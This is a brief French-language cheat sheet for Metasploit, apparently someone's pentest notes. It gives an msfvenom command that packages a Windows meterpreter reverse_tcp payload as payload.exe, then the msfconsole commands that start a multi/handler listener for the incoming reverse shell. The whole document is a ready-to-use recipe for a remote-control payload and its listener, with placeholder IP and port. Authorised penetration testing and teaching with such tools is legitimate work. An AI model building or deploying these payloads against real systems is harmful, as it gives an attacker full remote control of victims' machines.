# msfconsole

## Créer un _meterpreter_

```
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

## Attendre la connexion d'un _meterpreter_

```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT <PORT>
run
```
